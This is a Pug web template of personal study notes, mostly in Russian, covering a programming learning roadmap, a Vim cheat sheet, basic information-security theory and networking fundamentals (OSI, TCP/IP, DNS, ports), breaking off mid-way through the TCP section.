extends templates/layout

block menu
  .menu__inner
    a(href="https://www.cyberseek.org/pathway.html") pathway

https://www.hackthebox.com/
https://wrccdc.org/
https://picoctf.org/


    pre.
      1. rust + bash + SQL
      2. свои программы (2Д игра - нa ютуб видео с обучением переписываем на rust)
      3. Фреймворки (Работать программистом).
      4. Оценка сложности алгоритмов big O
      5. Базовые структуры данных:
        - массивы
        - связные списки
        - хэш-таблицы
        - стэк
        - очередь
        реализовать с нуля самостоятельно (поиск, вставка, удаление элемента)
      6. Системы счисления
        - шестнадцатиричные
        - двоичные
      7. Архитектура компьютэра
        - модульность памяти
        - сборщики мусора
        - разрядность процессора
        - регистры процессора
      8. Битовые операции
      9. Числа с плавающей точкой
      10. Строки
        - ASCII
        - UNICODE
        - Кодировки
      11. Язык Ассемблера (понимание как работает программа, ОС, вирус)
      12. Стек (программный)
        - передача параметров функции
        - кадры функции
        - возврат функции
      13. Рекурсия (взаимодействие со стеком)
      14. Сортировки (разобрать базовые алгоритмы сортировок:
        - пузырьком
        - вставками
        - кучей
        - Хоара
        - Ламуто
        - т.д.)
      15. Поиск (деревья и графы)
        - бинарное дерево поиска с реализацией вставки, поиска и удаления узлов
        - вэйл дерево
        - красночерное дерево
        - поиск в глубину и ширину графы
      16. Интернет
        - OSI
        - TCP/IP
      17. Операционные  системы
        - организация памяти
        - процессы
        - поток
      18. Файловая система
        - FAT 32
        - NTFS
        - EXT 4
      19. Исполняемые файлы
        - PE
        - ELF
      20. Сжатие
        - изображение
        - звук
        - видео
      21. Криптография
        - HTTPS
        - SSH
        - RSA
      22. 3Д графика
        - шейдеры
        - освещение объектов
        - реализации камеры
      23. Компиляторы
        - Лексический анализ
        - Синтаксический анализ
        - Симантический анализ
        - AST
        - Генерация машинного кода
      24. Математика и алгоритмы
        - книги кнута и корбана
    
    
    //- VIM
    details
      summary VIM
      pre.
        h  --> move left
        j  --> move down
        k  --> move up
        l  --> move right

        gg  --> Move to the first line of the page
        G   --> Move to the last line of the page
        number j -> down to number lines
        number k -> up to number lines
        :number   --> Go to the line number

        gcc  --> Comment/uncomment the current line
        gc{motion}  --> Comment/uncomment the lines covered by {motion}

        $  --> Go to the end of the line
        0  --> Go to the start of the line

        b  --> Go to the previous word
        w  --> Go to the next word
        e -> move to end of the word

        y - copy selected text
        yw - copy one word
        yy - the whole line
        x --> Delete the character under the cursor
        d --> Delete the selected text
        dw - to delete from the cursor up to the next word       d2w - repeat dw 2 times
        de - to delete from the cursor up to the end of the word d3e - repeat de 3 times
        d$ - to delete from the cursor to the end of a line
        dd - to delete a whole line                              d5d - repeat dd 5 times
        p --> Paste the previously deleted or copied text after the cursor

        i - insert before the cursor
        I - insert mode and places the cursor at the beginning of the line
        a - append after the cursor
        A - append after the line
        o - open line below cursor and place inte INSERT mode.
        O - open line above cursor and place inte INSERT mode.
        u - to undo previous actions
        U - to undo all the changes on a line
        Ctrl + r   --> Redo the undone action

        R - replace characters
        ce - to change from the cursor to the end of the word
        c$ - to change to the end of a line.
        ctrl-g - displays your location in the file and the file status.

        / - followed by a phrase to search
        n - search for the same phrase again
        N - search for the same phrase in the opposite direction
        ctrl-o - go back to where you came from
        ctrl-i - goes forward
        ? --> Start searching backward
        % - find matching characters
        To substitute new for the first old in a line type    :s/old/new
        To substitute new for all 'old's on a line type       :s/old/new/g
        To substitute phrases between two line #'s type       :#,#s/old/new/g
        To substitute all occurrences in the file type        :%s/old/new/g
        To ask for confirmation each time add 'c'             :%s/old/new/gc

        :! - run shell command
        :w filename - write content to the file
        :r filename - retrien and merge files.

        v - Visual Mode starting from the character under the cursor
        V - Visual Mode allowing selection of entire lines, starting with the current line
        ctrl+v - Visual Mode allowing selection of vertical blocks

        Ctrl + u   --> Move half a screen up
        Ctrl + d   --> Move half a screen down
        Ctrl + b   --> Move one full screen up
        Ctrl + f   --> Move one full screen down

        (  --> Jump to the beginning of the previous sentence
        )  --> Jump to the beginning of the next sentence
        {  --> Jump to the beginning of the previous paragraph
        }  --> Jump to the beginning of the next paragraph

        ]]  --> Move to the beginning of the next function
        [[  --> Move to the beginning of the previous function

        ]]  --> Move to the beginning of the next function
        [[  --> Move to the beginning of the previous function

        zf{motion}  --> Create a fold (replace {motion} with a movement command)
        zo          --> Open a fold
        zc          --> Close a fold
        zr          --> Reduce folding level throughout the file
        zm          --> Increase folding level throughout the file

    //- Теория
    details
      summary Теория
      p.
        Куб МакКамбера — это модель, созданная Джоном МакКамбером в 1991 году, чтобы помочь организациям создать и оценить инициативы по информационной безопасности, учитывая все связанные с ними факторы.<br>
        Эта модель безопасности имеет три измерения:<br>
        - Основополагающие принципы защиты информационных систем.<br>
        - Защита информации в каждом из ее возможных состояний.<br>
        - Меры предосторожности, используемые для защиты данных.<br>
        <br>
        Основные <em>принципы</em> защиты информации:<br>
        1. <dfn>Конфиденциальность</dfn> предотвращает раскрытие информации неавторизованным лицам, ресурсам или процессам.<br>
        Методы, используемые для обеспечения конфиденциальности, содержат шифрование данных, идентификацию личности и двухфакторную аутентификацию.<br>
        <br>
        2. <dfn>Целостность</dfn> обеспечивает защиту системной информации или процессов от преднамеренных или случайных изменений.<br>
        Одним из способов обеспечить целостность есть использование хэш-функции или контрольной суммы.<br>
        <br>
        3. <dfn>Доступность</dfn> означает, что авторизованные пользователи могут получить доступ к системам и данным, когда и где это необходимо, а те, которые не отвечают установленным условиям, нет.<br>
        Это может быть достигнуто за счет обслуживания оборудования, проведения ремонта аппаратного обеспечения, обновления операционных систем и программного обеспечения, и создания резервных копий.<br>
        <br>
        <em>Защита</em> информации в каждом из ее возможных состояний:<br>
        1. <dfn>Обработка</dfn> относится к состоянию данных, используемых для выполнения такой операции, как обновление записи базы данных (данные в обработке).<br>
        <br>
        2. <dfn>Хранение</dfn> определяет состояние данных, хранящихся в памяти или постоянном устройстве хранения, таком как жесткий диск, твердотельный накопитель или USB-накопитель (данные в состоянии покоя).<br>
        <br>
        3. <dfn>Передача</dfn> относится к состоянию перемещения данных между информационными системами (данные в пути).<br>
        <br>
        <em>Меры предосторожности</em>, используемые для защиты данных:<br>
        1.  <dfn>Осведомленность</dfn>, обучение и образование – это меры, предпринимаемые организацией, чтобы гарантировать, что пользователи знают о потенциальных угрозах безопасности и действиях, которые они могут принять для защиты информационных систем.<br>
        <br>
        2. <dfn>Технология</dfn> относится к программно-аппаратным решениям, разработанным для защиты информационных систем, таких как брандмауэры, постоянно контролирующие вашу сеть в поисках возможных вредных инцидентов.<br>
        <br>
        3. <dfn>Политика и процедуры</dfn> относятся к административным средствам контроля, которые обеспечивают основу для того, как организация реализует информационную безопасность, например, планы реагирования на инциденты и рекомендации по наилучшим практикам.<br>

        четыре основные характеристики сети:
        - отказоустойчивость,
        - масштабируемость,
        - качество обслуживания (QoS),
        - безопасность.

        Отказоустойчивость достигаеться вариантами машрутов.
        Наличие нескольких путей к пункту назначения
        известно как избыточность или резервирование (redundancy).

        Масштабируемость позволяет добавлять новых пользователей.

        Согласно политике QoS маршрутизатор может управлять потоками данных и голоса,
        предпочитая голосовое соединение при возникновении перегрузки в сети.
        Целью QoS является установка приоритетов для чувствительного к времени трафика.
        Важен тип трафика, а не его содержание.

        Администраторы сети также должны защищать информацию, передаваемую в пакетах по сети,
        а также хранящуюся на подключенных к сети устройствах.
        Достичь целей безопасности сети можно при соблюдении трех основных требований.

        Конфиденциальность – конфиденциальность данных означает,
        что только уполномоченные и авторизованные пользователи могут получать доступ к данным.

        Целостность - целостность данных гарантирует пользователям,
        что информация не была изменена во время передачи от источника к получателю.

        Доступность - доступность данных гарантирует авторизованным пользователям
        своевременный и надежный доступ к сервисам данных.

        Управление IP-трафиком основано на характеристиках и устройствах,
        связанных с каждым из трех уровней иерархической модели проектирования сети: доступа,
        распределения и ядра.

        Администраторы сети должны решать два типа безопасности:
        безопасность сетевой инфраструктуры и защиту информации.

        Администраторы сети также должны защищать информацию, 
        передаваемую в пакетах по сети, а также хранящуюся на подключенных к сети устройствах.
        Есть три основных требования для достижения целей безопасности сети:
        конфиденциальность, целостность и доступность.

        Типы киберугроз:

        Программные атаки (Software attacks)
        - Успешный отказ в обслуживании (DoS Attack).
        - Компьютерный вирус.

        Программные ошибки (Software errors)
        - Ошибка программного обеспечения.
        - Переход приложения в автономный режим.
        - Межсайтовый скрипт или предоставление нелегального доступа к ресурсам файлового сервера.

        Саботаж (Sabotage)
        - Авторизированный легальный пользователь выполняет успешное проникновение и компрометацию базы данных организации.
        - Искажение страниц веб-сайта организации.

        Человеческая ошибка (Human error)
        - Неумышленные ошибки при вводе данных.
        - Некорректные настройки межсетевого экрана.

        Кража (Theft)
        - Кража ноутбуков или оборудования из незапертой комнаты.

        Отказ оборудования (Hardware failures)
        - Выходы из строя жестких дисков.

        Сбои в предоставлении услуг (Utility interruption)
        - Отключение электроэнергии.
        - Повреждения, вызванные из-за попадания воды из неисправного разбрызгивателя.

        Стихийные бедствия (Natural disasters)
        - Мощные штормы, такие как ураганы или торнадо.
        - Землетрясения.
        - Наводнения.
        - Пожар.

        Организациям необходимо инвестировать в улучшенные методы безопасности:<br>
        - инвестирование в обучение по кибербезопасности для всего персонала, чтобы они были осведомлены и могли заметить кибератаку<br>
        - обеспечение двухфакторной аутентификации для сотрудников, получающих доступ к файлам и программам, содержащим конфиденциальные данные<br>
        - ведение файлов журналов и постоянный мониторинг для выявления аномального поведения, которое может свидетельствовать о нарушении безопасности<br>
        - хранение паролей клиентов с помощью комбинации засолки и надежных алгоритмов хеширования<br>
        - отделение облачных ресурсов от общедоступного Интернета в изолированный сегмент частной сети<br>
        - предоставление доступа сотрудников к персональным данным и внутренним системам только через защищенное VPN-соединение<br>
        <br>
        Некоторые полезные советы, которые помогут вам создать имя пользователя:<br>
        - Не используйте полное имя или часть адреса или номера телефона.<br>
        - Не используйте имя пользователя электронной почты.<br>
        - Не используйте одинаковое сочетание имени пользователя и пароля, особенно для финансовых аккаунтов.<br>
        - Не выбирайте имя пользователя, а затем не используйте его снова и снова – это облегчает отслеживание.<br>
        - Не выбирайте имя пользователя, которое дает подсказки к вашим паролям, например ряд цифр/букв или первую часть фразы, состоящую из двух частей, например стук-стук или звезда, или отдел, в котором вы работаете, например IT.<br>
        - Выберите имя пользователя, которое подходит для типа учетной записи, т.е. деловой, социальной или личной.<br>
        <br>
        Шифруйте все конфиденциальные данные компании, включая электронную почту.<br>
        Программное обеспечение обновляется с целью поддержания его актуального состояния и предотвращения использования уязвимостей.<br>
        <br>
        Знание и понимание ценности того, что вы защищаете поможет оправдать затраты на безопасность.<br>
        Создайте политику, четко определяющую правила организации, должностные роли, а также ответственность и ожидания для сотрудников.<br>
        Меры физической безопасности – ограничьте доступ к коммуникационным шкафам, серверным комнатам, а также к системам пожаротушения.<br>
        Необходимо провести проверку данных всех сотрудников.<br>
        Выполните регулярное резервное копирование и тестирование восстановления данных из резервных копий.<br>
        Регулярно обновляйте операционные системы и приложения сервера, клиента и сетевого устройства.<br>
        Настройте роли и уровни привилегий пользователей, а также надежную аутентификацию.<br>
        Используйте команду реагирования на инциденты и проверяйте сценарии реагирования на чрезвычайные ситуации.<br>
        Выберите решение для мониторинга безопасности, которое интегрируется с другими технологиями.<br>
        Используйте маршрутизаторы, межсетевые экраны и другие устройства безопасности нового поколения.<br>
        Используйте антивредоносное и антивирусное программное обеспечение корпоративного уровня.<br>
        <dfn>NetFlow</dfn> – важная технология для выявления кибератак, базирующаяся на анализе поведения.<br>
        Коммутаторы, маршрутизаторы и межсетевые экраны, оснащенные NetFlow, могут сообщать информацию о входе, выходе и транзите данных в сети.<br>

        Облачные услуги включают:
        SaaS – Программное обеспечение как услуга
        PaaS – Платформа как услуга
        IaaS - Инфраструктура как услуга

        Существует четыре основные облачные модели:
        Публичные облака - облачные приложения и услуги, предлагаемые в общедоступном облаке,
        доступны для широкой общественности.

        Частные облака – облачные приложения и сервисы, предлагаемые в частном облаке,
        предназначенные для определенной организации или, например, правительства.

        Гибридные облака – состоят из двух или более разных типов облаков,
        где каждая часть остается отдельным объектом, но обе связаны с помощью одной архитектуры.
        Облака сообщества - облака, созданные для эксклюзивного использования определенными сообществами.

        Виртуализация - это основа для облачных вычислений.
        Без виртуализации облачные вычисления в том виде, в каком они наиболее широко внедряются,
        были бы невозможны.

        Гипервизор — это программа, микропрограмма или аппаратное обеспечение,
        добавляющее уровень абстракции поверх физического оборудования.

        Гипервизоры типа 1 выполняются на голом железе,
        поскольку гипервизор устанавливается непосредственно на аппаратное обеспечение.
        Такие гипервизоры обычно используются на корпоративных серверах
        и сетевых устройствах центров обработки данных.

        Гипервизор типа 2 — это программное обеспечение,
        создающее и запускающее экземпляры виртуальной машины.
        Компьютер, на котором гипервизор поддерживает одну или несколько виртуальных машин,
        является узловой машиной – хостом.

    //- OSI
    details
      summary OSI
      p.
        OSI - эталоная модель
        <dfn>Модель взаимодействия открытых систем</dfn> (Open Systems Interconnection, OSI): <br>
        - эталонная модель организации компьютерных сетей, <br>
        - юридический стандарт организации ISO, <br>
        - 7 уровней организации сети и их назначение, <br>
        - протоколы не включены в модель, <br>
        - не используется на практике, <br>
        удобна для описания компьютерных сетей.<br>
      table
        caption Уровни OSI
        tr
          th Уровень
          th Единица
          th Оборудование
        tr
          td Прикладной
          td Сообщение
          td На хосте
        tr
          td Представления
          td Сообщение
          td На хосте
        tr
          td Сеансовый
          td Сообщение
          td На хосте
        tr
          td Транспортный
          td Сегмент/Дейтаграмма
          td На хосте
        tr
          td Сетевой
          td Пакет
          td Маршрутизатор
        tr
          td Канальный
          td Кадр
          td Коммутатор, точка доступа Wi-Fi
        tr
          td Физический
          td Бит
          td Концентратор, репитор
      br
      p.
        <dfn>Физический уровень</dfn> - основная задача это передача битов по физическому каналу связи, т.е. перевод битов в сигнали и обратно. Бит - 0 или 1. <br>
        Сигналы передаются по: <br>
        - перепады напряжения для меди, <br>
        - импульсы для оптоволокна, <br>
        - электромагнитное излучение для радиосвязи. <br>
        <br>        
        Передача потока бит по среде передачи данных: <br>
        - не вникает в смысл передаваемой информации, <br>
        - единица передачи информации - бит (...01100111001...) <br>
        <br>
        <dfn>Задача физического уровня</dfn> - представить биты информации в виде сигналов, передаваемых по среде. <br>
        <br>
        <dfn>Характеристики канала связи</dfn>:<br>
        Скорость канала: <br>
        - Пропускная способность (бит/с) - количество передачи данных за еденицу времени. <br>
        - Задержка - сколько времени пройдёт пока сообщение от отправителя дойдёт до получателя.<br>
        Количество ошибок - если возникают часто, то сетевое оборудование должно иметь инструменты их исправления, если редко, то ошибки можно исправлять на более высоких уровнях.<br>
        <br>
        <dfn>Типы каналов связи</dfn>:<br>
        - Симплексный - пердача только в одну сторону.<br>
        - Дуплексный - передача данных в обе стороны одновременно.<br>
        - Полудуплексный - передача данных в обе стороны по очереди.<br>
        <br>
        <em>Кабель - ошибки редко:</em> <br>
        Витая пара - скрученные для уменьшения помех медные кабели. <br>
        Оптический кабель - тонкие световоды объединяються в один кабель.<br>
        <br>
        <em>Беспроводные технологии - ошибки часто:</em><br>
        Радиоволны - GSM 900 МГц лицензируется, Wi-Fi 2,4 ГГц и 5 ГГц без лицензий.<br>
        <br>
        <em>Спутниковые каналы.</em>
        <br>
        <em>Представление информации:</em> <br>
        Медные провода - кодирование - прямоугольные импульсы. <br>
        Оптоволокно, беспроводная среда - модуляция - синусоидальные волны.<br>        
        <br>
        <dfn>Канальный уровень</dfn>:<br>
        - определяет начало/конец сообщения в потоке бит, <br>
        - обноруживает и исправляет ошибки, <br>
        - управляет доступом к среде передачи данных (одномоментно передаёт только один.), <br>
        - физическая адресация (МАС). <br>
      img(src="./img/web/chenel.jpg" alt="")
      img(src="./img/web/chenel_.jpg" alt="")
      img(src="./img/web/MAC.jpg" alt="")
      br
      p.
        <dfn>Сетевой уровень</dfn>: <br>
        - создание составной сети и согласование различий в сетях, <br>
        - адресация (сетевые и глобальные адреса), <br>
        - определение маршрута пересылкипакетов в составной сети (маршрутизация), <br>
        <br>
        <dfn>Транспортный уровень</dfn>: <br>
        - передача данных между процессами на хостах, <br>
        - управляет надёжностью (защищённый от ошибок канал с гарантированным порядком следованиясообщеницй), <br>
        - сквозной уровень от отправителя к получателю. <br>
        <br>
        <dfn>Сеансовый уровень</dfn>: <br>
        - создаёт сеансы связи, <br>
        - управляет диалогом (очерёдностью передачи сообщений), <br>
        - управляет маркерами (недопускает одновременно выполнять критические операции), <br>
        - синхронизация (метки в сообщениях для возобновления передачи в случае сбоя связи), <br>
        - на практике сеансовый уровень в сетях не используется. <br>
        <br>
        <dfn>Уровень представления</dfn>: <br>
        - согласование форматов представления символов и чисел, <br>
        - шифрование и дешифрование. <br>
        <br>
        <dfn>Прикладной уровень - приложения</dfn>: <br>
        - web-страницы, <br>
        - соц.сети, <br>
        - видео и аудио связь <br>
        - почта, <br>
        - доступ к файлам и т.д.<br>
      img(src="./img/web/OSI_.png" alt="")
      img(src="./img/web/OSI__.png" alt="")
      img(src="./img/web/OSI.jpg" alt="")
      a(href="https://kr-labs.com.ua/blog/model-osi/") osi   <br>

    //- TCP/IP
    details
      summary TCP/IP
      img(src="./img/web/TCP_IP.jpg" alt="")
      p.
        <dfn>TCP/IP</dfn> - произошло от TCP и IP. <br>
        Набор правил, который позволяет обрабатывать сквозную передачу данных. <br>
        Сюда входит: формирование пакетов, способ их отправки, получения, маршрутизации, распаковки для передачи программному обеспечению. 
        
        TCP/IP - модель протокола
        TCP/IP              Протоколы в заголовках сообщений
        Application     -   HTTP (передача данных в формате HTML)
        Transport       -   TCP (на каком порту работает приложение, контроль доставки)
        Internet        -   IP (находжение устройства по ip-адресу)
        Network access  -   Ethernet (общение между сетевыми картами в одной сети)

        TCP/IP              Задачи
        Application     -   Отображение пользователю, кодирование, шифрование, управление сеансами
        Transport       -   Установка соединения между устройствами в разных сетях.
        Internet        -   Межсетевой маршрут от отправителя к полячателю.
        Network access  -   Управление устройствами внутри сети.



      //- Internet
      details
        summary Internet
        p.
          <dfn>Интернет</dfn> (англ. Internet) — всемирная система объединённых компьютерных сетей для хранения, обработки и передачи информации. <br>
          Сеть сетей, которая объединяет в себе компьютеры, маршрутизаторы и сервера.<br>
          Очень большая сеть компьютеров, которые взаимодействую друг с другом.<br>
          Интернет - это инфраструктура, а ВЭБ - это сервис, построенный на основе этой инфраструктуры.<br>
          <br>
          <dfn>Всемирная паутина</dfn> (англ. World Wide Web) — распределённая система, предоставляющая доступ к связанным между собой документам, расположенным на различных компьютерах, подключённых к сети Интернет<br>
          <br>
          <dfn>Веб-служба, веб-сервис</dfn> (англ. web service) — идентифицируемая уникальным веб-адресом (URL-адресом) программная система со стандартизированными интерфейсами, а также HTML-документ сайта, отображаемый браузером пользователя<br>

      //- URI
      details
        summary URI
        p.
          <dfn>URI</dfn> - Унифицированный идентификатор ресурса<br>
          URI включают в себя как URL, URN, так и другие способы указания ресурса.<br>
          <dfn>URI данных</dfn> - это не URL или URN, потому что содержит данные.<br>
          Он не называет ресурс и не указывает, как его найти по сети.<br>
          Примером URI, который не является ни URL-адресом, ни URN, будет URI данных, например:
        code data:Hello%20World
        p.
          <dfn>URL</dfn> (Uniform Resource Locator — унифицированный указатель ресурса) - адрес, который выдан уникальному ресурсу в интернете. <br>
          В теории, каждый корректный url ведёт на уникальный ресурс. <br>
          Такими ресурсами могут быть html-страница, css-файл, изображение и т.д <br>
          <br>
          <dfn>URN</dfn> (Uniform Resource Name) является уникальным именем объекта. <br>
          URN включает в себя название пространства имен и идентификатора в этом пространстве. <br>
          <br>
          Существуют также единые ссылки ресурсов (URC), которые указывают на метаданные о документе, а не на сам документ. <br>
          <dfn>URC</dfn> - это другой тип URI, который не является ни URL, ни URN.<br>
          Примером URC будет индикатор для просмотра исходного кода веб-страницы:
        code>view-source:http://example.com/
        br
        img(src="./img/web/uri.png" alt="")
        img(src="./img/web/URL.png" alt="")

      //- DNS
      details
        summary DNS      
        p.
          <dfn>Домен</dfn> (доменное имя) – это псевдоним для IP-адреса понятный для человека, состоящий из набора символов и цифр. <br>
          Каждое доменное имя в Интернете является уникальным. <br>
          Максимальная длина доменного имени (между точками) – 63 символа. <br>
          Общая длина имени, включая поддомены, разделительные точки и имя зоны домена, может составлять до 255 знаков.<br>
        img(src="./img/web/domain.png" alt="")
        img(src="./img/web/domains.png" alt="")
        br
        p.
          <dfn>DNS</dfn> (англ. Domain Name System — система доменных имён) — компьютерная распределённая система для получения информации о доменах. <br>
          Чаще всего используется для получения IP-адреса по имени хоста (компьютера или устройства). <br>
          DNS - это распределённая база данных, которая сопоставляет доменные имена с IP-адресами. <br>
          Когда пользователь вводит доменное имя в браузере, браузер отправляет DNS - запрос на DNS-сервер для преобразования доменного имени в IP-адрес. DNS-сервер прослушивает порт 53. <br>
          Система адресов интернета имеет иерархическую структуру: <br>
          - домены уровня страны (.us) <br>
          - домены верхнего уровня (.com) <br>
          - поддомены.<br>
        img(src="./img/web/dns.png" alt="")
        img(src="./img/web/DNS.png" alt="")

      //- ISP
      details
        summary ISP
        p.
          <dfn>Интернет-прова́йдер</dfn> (иногда просто провайдер; от англ. internet service provider, сокр. ISP — поставщик интернет-услуги) — организация, предоставляющая услуги доступа к сети Интернет и иные связанные с Интернетом услуги.<br>
          <br>    
          <dfn>Хостинг</dfn> (англ. hosting) — услуга по предоставлению ресурсов для размещения информации на сервере, постоянно находящемся в сети (обычно Интернет). <br>
          Это комбинация программных и аппаратных технологий, позволяющая разместить в интернете сайт, приложение, базу данных и их составные компоненты, требующие постоянного нахождения в онлайне. <br>
          <br>
          Два основных термина: хостинг-сервер и хостинг-провайдер. <br>
          <dfn>Сервер</dfn> - компьютер, на котором храняться файлы сайта или приложения. Работает 24/7. <br>
          <dfn>Хостинг-провайдер</dfn> - компания, обслуживающая сервер и создающая ПО для него. <br>
          Процессор, оперативная память и дисковое пространство сервера передаются клиенту в пользование за плату.<br>

      //- Браузер
      details
        summary Браузер
        p.
          <dfn>Браузер</dfn> - это программа, которая позволяет искать информацию в интернете, просматривать сайты, скачивать и загружать файлы. Это среднее звено между пользователем и интернетом.<br>
          Пользователь вводит в адресную строку браузера адрес сайта.<br>
          Браузер ищет сервер по IP-адресу. Сервер - это программа.<br>
          Сначала он ищет в кэше роутера, операционной системе или в истoрии подключений.<br>
          Потом смотрит в DNS.<br>
          Найдя нужный IP-адрес, браузер устанавливает соединение с сервером с помощью протокола TCP/IP.<br>
          Для установки соединения используется процесс "<dfn>рукопожатие</dfn>" (handshaking)<br>
          Браузер отправляет HTTP запрос на сервер для отображения страницы.<br>
          Запрос обрабатывается вэб-сервером.<br>
          После этого сервер отправляет браузеру ответ с данными:<br>
          - файлы cookie<br>
          - способ кэширования<br>
          - контент страницы<br>
          Браузер обрабатывает ответ и отображает запрашиваемый контент (рендеринг).
          
      //- Ethernet
      details
        summary Ethernet
        img(src="./img/web/Ethernet.jpg" alt="")
        img(src="./img/web/CSMA.jpg" alt="")
        img(src="./img/web/ICMP.png" alt="")
        p.
          После преамбулы все компьютеры в сети начинают записывать передаваемый кадр в свой буфер.<br>
          Первые 6 байт кадра содержат адрес получателя: <br>
          - компьютер, который узнал свой адрес, продолжает записывать кадр, <br>
          - остальные удаляют кадр из буфера. <br>
          <br>
          Для диагностики сети удобно использовать Promiscuous mode (неразборчивый режим работы стевого адаптера) - адаптер принимает все кадры в сети, не зависимо от МАС-адреса получателя. <br>
          <br>
          Недостатки классического Ethernet: <br>
          <em>Плохая масштабируемость</em>: <br>
          - сеть становиться неработоспособной при загрузки разделяемой среды больше чем на 30%, <br>
          - работоспособное количество компьютеров - 30. <br>
          <br>
          <em>Низкая безопасность</em> - данные в разделяемой среде доступны всем. <br>
          <em>Разное время доставки кадра</em>: <br>
          - причина - коллизии, <br>
          - плохо для трафика реального времени (аудиозвонок, видеоконференция). <br>
          <br>
          В распределяемой среде возможны коллизии. <br>
          В коммутируемом Ethernet соединение Точка-Точка без разделяемой среды.<br>
        img(src="./img/web/net1.jpg" alt="")
        img(src="./img/web/net2.jpg" alt="")
        img(src="./img/web/Firewall.png" alt="")
        img(src="./img/web/Proxy.png" alt="")
        img(src="./img/web/ReverseProxy.png" alt="")
        img(src="./img/web/ReverseProxy_.png" alt="")
        img(src="./img/web/VLAN.png" alt="")
        img(src="./img/web/VPN.png" alt="")
        img(src="./img/web/VPN_.png" alt="")

      //- Protocol
      details
        summary Protocol
        p.
          <dfn>Протокол</dfn> — документ, фиксирующий какое-либо событие, факт или договоренность.<br>
          Веб-протокол, також відомий як протокол передачі даних, являє собою своєрідний набір правил, що описують послідовність, особливості взаємодії двох або більше пристроїв, підключених до однієї мережі та здійснюючих зв'язок.
          Протоколы:
          IPv4, IPv6,
          ICMP, ICMPv6,
          DHCP, DHCPv6.
          TCP, UDP,
          HTTP, HTTPS
          DNS, SSH
          WLAN, Ethernet

          Характеристики протокола:
          Формат сообщения - зависит от типа сообщения и канала передачи.
          Розмер сообщения - зависит от канала передачи.
          Синхронизация - определяет в какой очередности и с какой скоростью узлы будут отправлять сообщения.
          Кодирование - биты кодируются отправителем в виде световых, электрических или электромагнитных импульсов,
                      взависимости от среды передачи сигнала. Получатель эти импульсы декодирует в биты.
          Инкапсуляция - добавление к фрагменту сообщения заголовка с данными об отправиле и получете.
          Шаблон сообщения - требуется ли подтверждение о получении сообщения перед отправкой следующего или нет.

          DHCP/ICMPv6 - Ethernet/WLAN - IP address, network, gateway, DNS server.

          Стандарты:
          IEEE, IETF (RFC), IANA, ICANN, ITU, TIA.
        
        a(href="https://hyperhost.ua/info/uk/osnovni-protokoli-merezhi-navishcho-voni-vikoristovuyutsya") protokoli   <br>
        a(href="https://deltahost.ua/ua/tipi-merezhevix-protokoliv-i-ih-priznachennya-http-ip-ssh-ftp-pop3-mac.html") protokoli <br>
        img(src="./img/web/Protocol.png" alt="")
        img(src="./img/web/ProtocolCode.png" alt="")
        img(src="./img/web/ProtocolWeb.png" alt="")

        //- IP & Port
        details
          summary IP & Port
          p.
            <dfn>Internet Protocol</dfn> (IP, досл. «межсетевой протокол») - маршрутизируемый протокол сетевого уровня стека TCP/IP. <br>
            Именно IP стал тем протоколом, который объединил отдельные компьютерные сети во всемирную сеть Интернет. <br>
            Неотъемлемой частью протокола является адресация сети - IP-адрес. <br>
            <dfn>IP-адрес</dfn> — уникальный сетевой адрес узла в компьютерной сети, построенной на основе стека протоколов TCP/IP. <br>
            В сети Интернет требуется глобальная уникальность адреса, в случае работы в локальной сети требуется уникальность адреса в пределах сети. <br>
            Чтобы обратиться к какому-то компьютеру, каждый компьютер, подключенный к сети, имеет свой уникальный адрес - IP-адрес. <br>
            Каждый компьютер, подключенный к интернету, может быть доступен через публичный IP-адрес, который состоит из 32 бит для IPv4 <br>
            (такие адреса обычно записываються в виде четырёх чисел от 0 до 255, разделённых точками: 173.194.121.32) <br>
            или 128 бит для IPv6 <br>
            (обычно записываются в виде 8 групп по 4 шестнадцатиричных чисела, разделённых двоеточиями: 2027:0da8:8b73:0000:0000:8a2e:0370:1337)
                    ICANN (Internet Corporation for Assigned Names and Numbers)
            «Корпорация по управлению доменными именами и IP-адресами».

            Service Name and Transport Protocol Port Number Registry:
            https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml


            Сокет - комбинация исходного IP-а   дреса и номера порта источника,
            или IP-адреса и номера порта назначения.
            192.168.1.5:1099 - сокет источника
            192.168.1.7:80 - сокет веб сервера

            Netstat – это сетевая утилита, которая может использоваться для проверки соединений.
            Параметр -n  - отображение IP-адресов и номеров портов в числовом виде.

            Порты назначаются и управляются организацией, известной как ICANN.
            Порты делятся на три категории и имеют число от 1 до 65535:

            Хорошо известные порты – порты назначения, связанные с общими сетевыми программами,
            идентифицируются как хорошо известные порты. Эти порты находятся в диапазоне от 1 до 1023.

            Зарегистрированные порты – порты от 1024 до 49151 можно использовать в качестве портов источника или назначения.
            Они могут быть использованы организациями для регистрации конкретных приложений, таких как программы чата.

            Частные порты – порты от 49 152 до 65 535, которые часто используются как порты источника.
            Эти порты могут использоваться любыми приложениями.

            nslookup - найти IP-адрес для любого доменного имени.


            ipconfig – перегляд інформації про IP-конфігурацію.
            ping     – перевірка з'єднань з іншими IP-хостами.
            netstat  – перегляд мережних з'єднань.
            tracert  – перегляд маршруту до місця призначення.
            nslookup – запит інформації про домен отримувача безпосередньо з серверу доменних імен.

            Команда ipconfig /all предназначена для просмотра расширенной информации,
            включая MAC-адреса, IP-адреса шлюза по умолчанию и DNS-серверы.
            Также указывается, включен ли протокол DHCP и выводятся данные адреса DHCP-сервера и информация об аренде.

            Если используется динамическое назначение IP-адресов,
            команда ipconfig /release удаляет существующие привязки адресов DHCP. 
            Команда ipconfig /renew запрашивает текущую конфигурацию с DHCP-сервера.
            Хост может содержать ошибочную или устаревшую информацию о конфигурации IP,
            и простое обновление этой информации – это все, что нужно для восстановления соединения.
          img(src="./img/web/Port.png" alt="")
          img(src="./img/web/Ports.pdf" alt="")              
        
        //- TCP
        details
          summary TCP
          p.
            <dfn>TCP</dfn> - Transmission Control Protocol - протокол управления передачей <br>
            Обмен данными, ориентированный на соединения, может использовать надежную связь, для обеспечения которой
            протокол уровня 4 (транспортный) посылает подтверждения о полученных данных и запрашивает повторную передачу, если данные не получены
            или искажены. <br>
            Пакеты в TCP называются сегментами. <br>
            TCP используется в прикладных протоколах HTTP, FTP, SMTP, Telnet. <br>
            Перед отправкой сообщения по протоколу TCP соединение должно быть открыто. <br>
            Механизм TCP предоставляет поток данных с предварительной установкой соединения, осуществляет повторный запрос данных в случае потери данных и устраняет дублирование при получении двух копий одного пакета.<br>
            Процесс начала сеанса TCP (также называемый <dfn>«рукопожатие»</dfn> (англ. handshake)), состоит из трёх шагов. <br>
            <br>
